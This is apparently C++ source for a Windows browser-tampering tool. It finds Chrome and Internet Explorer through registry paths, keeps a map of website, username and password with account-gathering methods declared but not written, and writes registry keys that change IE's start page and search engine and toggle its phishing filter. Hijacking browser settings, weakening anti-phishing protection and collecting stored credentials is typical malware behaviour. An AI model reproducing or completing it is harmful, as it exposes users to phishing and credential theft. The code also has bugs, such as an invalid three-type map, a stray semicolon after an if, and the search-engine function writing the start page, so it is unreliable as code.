using namespace std;

class Browser
{
public:
	bool does_exist = FALSE; // Flag for the installation status
	BYTE browser_path[256]; // Current version of the browser
	char *registry_check; //Path that is checked to determine installation status
	map<string, string, string> accounts; // Map of website | username | password 
	HKEY hKey; // Used for opening and closing registry keys;
	const char *c_version;
	// Methods
	bool exists()
	{
		return does_exist;
	}

	const char* Version()
	{
		return c_version;
	}
	map<string, string, string> GetAccounts()
	{
		return accounts;
	}

	void cConstructor()
	{
		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, registry_check, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
		{
			DWORD browser_path_size = sizeof(browser_path);
			if (RegQueryValueEx(hKey, "", NULL, NULL, browser_path, &browser_path_size) == ERROR_SUCCESS);
			{
				c_version = reinterpret_cast<const char*>(browser_path);
				does_exist = TRUE;
			}
		}
		else
		{
			does_exist = FALSE;

		}
		RegCloseKey(hKey);
	}
};




class Chrome :public Browser
{
public:

	Chrome()
	{
		registry_check = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe";
		cConstructor();
	}
	int Chrome::GetAccountss();
};


class IExplorer :public Browser
{
public:

	IExplorer()
	{
		registry_check = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\IEXPLORE.EXE";
		cConstructor();
	}
	int SetHomePage();
	int SetSearchEngine();
	int TogglePhishFilter(BOOL set_value);
	int IExplorer::GetAccountss();
};




int SetHomePage(string home_page)
{
	HKEY startpage_key;
	if (RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Internet Explorer\\MAIN", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &startpage_key) == ERROR_SUCCESS)
	{
		if (RegSetValueEx(startpage_key, "Start Page", 0, REG_SZ, (LPBYTE)home_page.c_str(), sizeof(home_page)) == ERROR_SUCCESS)
		{
			RegCloseKey(startpage_key);
			return 1;
		}
	}
	else
	{
		cout << GetLastError() << endl;
		RegCloseKey(startpage_key);
		return 0;
	}
	RegCloseKey(startpage_key);
}




int SetSearchEngine(string search_url)
{
	HKEY startpage_key;
	if (RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Internet Explorer\\MAIN", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &startpage_key) == ERROR_SUCCESS)
	{
		if (RegSetValueEx(startpage_key, "Start Page", 0, REG_SZ, (LPBYTE)search_url.c_str(), sizeof(search_url)) == ERROR_SUCCESS)
		{
			RegCloseKey(startpage_key);
			return 1;
		}
	}
	else
	{
		cout << GetLastError() << endl;
		RegCloseKey(startpage_key);
		return 0;
	}
	RegCloseKey(startpage_key);
}



int IExplorer::TogglePhishFilter(BOOL set_value) // Return TRUE if phishfilter is on FALSE otherwise
{
	if (RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Internet Explorer\\PhishingFilter", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
	{
		DWORD new_key;
		if (set_value == FALSE)
		{
			new_key = 00000001;
		}
		else
		{
			new_key = 00000002;
		}
		cout << "AAA" << endl;

		if (RegSetValueEx(hKey, "EnabledV8", 0, REG_DWORD, (const BYTE*)&new_key, sizeof(new_key)) == ERROR_SUCCESS)
		{
			RegCloseKey(hKey);
			return TRUE;
		}
		else if (RegSetValueEx(hKey, "EnabledV9", 0, REG_DWORD, (const BYTE*)&new_key, sizeof(new_key)) == ERROR_SUCCESS)
		{
			RegCloseKey(hKey);
			return TRUE;
		}
	}
	else
	{
		cout << GetLastError() << endl;
		RegCloseKey(hKey);
		return FALSE;
	}
	RegCloseKey(hKey);
}
